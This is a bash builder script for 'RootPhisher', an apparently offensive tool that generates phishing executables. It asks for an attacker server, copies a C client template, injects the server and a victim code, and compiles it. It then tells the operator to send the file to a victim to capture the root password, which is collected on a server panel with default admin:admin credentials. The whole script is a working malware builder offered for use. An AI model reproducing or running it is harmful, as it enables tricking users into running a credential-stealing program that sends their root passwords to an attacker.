#!/bin/bash
clear
cat files/banner
echo ""
echo "Welcome to RootPhisher"
echo "Press any key to start..."
read start
echo ""
echo ""
echo "[i] Follow the options to configure the client."
echo ""
echo "Eg.: /root"
echo -n "[=] Path to generate the client: "
read path
echo ""
echo ""
echo "Eg.: client"
echo -n "[=] Name for the file: "
read name
echo ""
echo ""
echo "Eg.: attacker.com"
echo -n "[=] Your server: "
read server
echo ""
echo ""
echo "Eg.: rootphisher"
echo "(Without '/')"
echo "If it is '/' leave it in blank"
echo -n "[=] Server Path: "
read rpath
code=$(shuf -n 1 -i 0-5000)
echo ""
echo "GIVEN OPTIONS"
echo "================"
echo ""
echo "Name: $name"
echo "Victim code: $code"
echo "Server: http://$server/$rpath"
echo "Path: $path"
echo ""
echo ""
echo "CLIENTS"
echo "=========="
echo "1) Error_Msg_Client => After the execution, shows you an error saying software not compatible or a non-rooted user executed the program."
echo ""
echo "2) Cmd_Prompt_Client => After the execution, open a very simple command shell line."
echo ""
echo "3) Shell_Type_Client => Only use this if the other clients are not working, this client uses only shell commands with system(); instead of C functions."
echo ""
echo ""
echo "Enter the number of the option do you want."
echo ""
echo -n "Client> "
read opt
case $opt in

1) echo "[*] Selected: $opt [ Error_Msg_Client ]";
cp files/Error_Msg_Client.c .client
;;

2) echo "[*] Selected: $opt [ Cmd_Prompt_Client ]";
cp files/Cmd_Prompt_Client.c .client
;;

3) echo "[*] Selected: $opt [ Shell_Type_Client ]";
cp files/Shell_Type_Client.c .client
;;


*) echo "$opt does not exists";
echo "Press enter to exit ...";
read foo;;
esac

echo "[*] Creating the C file with the given options..."
sed -i "s/<SERVER>/$server/g" ".client"
sed -i "s/<PATH>/$rpath/g" ".client"
sed -i "s/<CODE>/$code/g" ".client"
cp .client $path/$name.c
rm .client
echo "[*] Compiling the C file ..."
gcc -o $path/$name $path/$name.c > /dev/null 2>&1
rm $path/$name.c
echo "[+] Done."
echo "[+] Executable generated successfully in $path/$name"
echo "[*] Saving configuration in codes/$code"
echo "[+] Done."
echo "[i] Now send the executable to your victim and wait to obtain root password ;)"
echo "[i] Find the root password in the Server Panel by searching for the victim code showed before"
echo "[i] Default Server Panel Access Credentials => admin:admin"
echo "GIVEN OPTIONS" > codes/$code
echo "================" >> codes/$code
echo "" >> codes/$code
echo "Name: $name" >> codes/$code
echo "Victim code: $code" >> codes/$code
echo "Server: http://$server/$rpath" >> codes/$code
echo "Path: $path" >> codes/$code
echo "" >> codes/$code
exit
